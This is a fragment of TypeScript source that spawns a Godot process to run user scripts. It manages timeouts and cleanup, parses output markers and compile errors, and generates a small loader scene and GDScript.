
    // ipc P1-7 fix: settled 防close/error/timer 重复触发; timer 兜底释放 slot + reject
    // 防 forceKillTree 后进程不 emit close(Windows taskkill 失败/driver bug) 致 slot 永占 + pending 永悬
    let settled = false;
    const timer = setTimeout(() => {
      if (settled) return;
      if (!proc.killed) {
        forceKillTree(proc);
        unregisterSpawn();  // B-T4: timeout 强杀后注销（exit 事件可能不触发）
      }
      settled = true;
      releaseShortRunningSlot();
      retryRm(sessionDir).catch(() => {});
      reject(new Error(`Godot process timed out after ${timeout}s`));
    }, timeout * 1000);

    proc.on('close', (exitCode) => {
      if (settled) return;  // ipc P1-7: timer 已 reject(timeout)
      settled = true;
      clearTimeout(timer);
      unregisterSpawn();  // B-T4 对称补全：exit/error/timeout/pipe 均已调，close 也补（Set 幂等，防 close 先于 exit 的 driver 边界）
      const stdout = Buffer.concat(stdoutChunks).toString('utf-8');
      const stderr = Buffer.concat(stderrChunks).toString('utf-8');
      releaseShortRunningSlot();
      // Cleanup session directory (fire-and-forget async)
      // A-07: retryRm 处理 Windows EPERM(Godot 退出瞬间短暂持有 .gd 句柄)。原裸 rm 静默吞错致
      // sessionDir 残留累积,实测触发 cleanupOldSessions 的 retryRm 退避阻塞主路径 38s flaky。
      retryRm(sessionDir).catch(() => {});

      const rawOutput = stdout + stderr;
      const duration = Date.now() - startTime;
      const { parsed, logLines } = parseMcpMarkers(rawOutput, rndResult, rndError);
      const analysis = analyzeOutput(logLines, projectPath ? { projectPath } : undefined);

      if (parsed) {
        const isSuccess = parsed.success === true;
        // Detect compile errors from Godot output
        const compileError = extractCompileError(rawOutput);
        const hasCompileError = compileError.length > 0;

        resolve({
          success: isSuccess && !hasCompileError,
          compile_success: !hasCompileError,
          compile_error: compileError,
          errors: analysis.errors,
          run_success: isSuccess,
          run_error: parsed.error || '',
          outputs: (parsed.outputs || []) as OutputEntry[],
          raw_output: logLines.join('\n'),
          duration_ms: duration,
          autoload_detected: autoloadDetected,
          executionId,
          scriptSha256,
        });
      } else {
        // No marker found — likely a compile error or crash
        const compileError = extractCompileError(rawOutput);
        const hasCompileError = compileError.length > 0;
        // Safety net: if no real errors (only RID leak cleanup warnings),
        // the script likely ran but cleanup crashed before marker print
        if (!hasCompileError && exitCode !== 0) {
          const hasRealError = /\b(Parse Error|Script Error|SCRIPT ERROR)\b/.test(rawOutput);
          if (!hasRealError) {
            resolve({
              success: false,
              compile_success: true,
              compile_error: '',
              errors: analysis.errors,
              run_success: false,
              run_error: `Process exited with code ${exitCode} (likely RID leak during cleanup, no script error found)`,
              outputs: [],
              raw_output: logLines.join('\n'),
              duration_ms: duration,
              autoload_detected: autoloadDetected,
              executionId,
              scriptSha256,
            });
            return;
          }
        }
        resolve({
          success: false,
          compile_success: !hasCompileError,
          compile_error: compileError,
          errors: analysis.errors,
          run_success: false,
          run_error: exitCode !== 0 ? `Process exited with code ${exitCode}` : 'No structured output found',
          outputs: [],
          raw_output: logLines.join('\n'),
          duration_ms: duration,
          autoload_detected: autoloadDetected,
          executionId,
          scriptSha256,
        });
      }
    });

    proc.on('error', (err) => {
      if (settled) return;  // ipc P1-7: timer 已 reject
      settled = true;
      clearTimeout(timer);
      releaseShortRunningSlot();
      // C8: retryRm 对齐 timer(:1255)/close(:1269) 分支(Windows EPERM 容错,原裸 rm 静默吞错致残留)。
      retryRm(sessionDir).catch(() => {});

      // Spawn failure is fatal — reject so callers can catch and report
      reject(new Error(`Failed to spawn Godot process: ${err.message}`));
    });
  });
}

/**
 * Extract compile error from Godot output.
 * Godot prints errors like: "scripts/gdscript/gdscript.cpp:123 - Parse Error: ..."
 */
function extractCompileError(raw: string): string {
  const lines = raw.split('\n');
  const errors: string[] = [];
  for (const line of lines) {
    const trimmed = line.trim();
    // C2 根治(final review 揭示 \b 非根治): Godot 编译错误格式 ":line - Parse Error:"(见 :1356 注释)。
    // 原 \b 在词首仍匹配——print("Parse Error: debug") 的 "Parse Error:" 在字符串开始,\b 匹配词首边界
    // 仍误判;dash 前缀要求 Godot 格式 ":<num> - Parse Error:",用户 print 无此格式不匹配。
    if (/:[0-9]+ - (Parse Error|Script Error):/.test(trimmed)) {
      errors.push(trimmed);
    }
  }
  return errors.join('\n');
}

// ─── Autoload loader helpers ──────────────────────────────────────────────────

/**
 * Create a minimal .tscn scene that loads with autoload context.
 * The scene runs the user's script from _ready().
 */
export function createAutoloadLoaderScene(loaderScriptPath: string): string {
  const loaderPathRes = loaderScriptPath.replace(/\\/g, '/').replace(/"/g, '\\"');
  return [
    '[gd_scene load_steps=2 format=3]',
    '',
    '[ext_resource type="Script" path="' + loaderPathRes + '" id="1"]',
    '',
    '[node name="MCPLoader" type="Node"]',
    'script = ExtResource("1")',
    '',
  ].join('\n');
}

/**
 * Create the loader GDScript that loads with autoload context.
 * In _ready(), all autoloads are available. It then loads and runs the user script.
 */
export function createAutoloadLoaderScript(userScriptPath: string, errorMarker: string): string {
  const pathRes = userScriptPath.replace(/\\/g, '/').replace(/"/g, '\\"');
  return [
    'extends Node',
    '',
    'func _ready() -> void:',
    '\tvar user_script: GDScript = load("' + pathRes + '") as GDScript',
    '\tif user_script == null:',
    '\t\tprint("' + errorMarker + '" + JSON.stringify({"success": false, "error": "Failed to load user script"}))',
    '\t\tget_tree().quit(0)',
    '\t\treturn',
    '\tvar instance: Variant = user_script.new()',
    '\tif instance.has_method("_initialize"):',
    '\t\tinstance._initialize()',
    '\tget_tree().quit(0)',
  ].join('\n') + '\n';
}
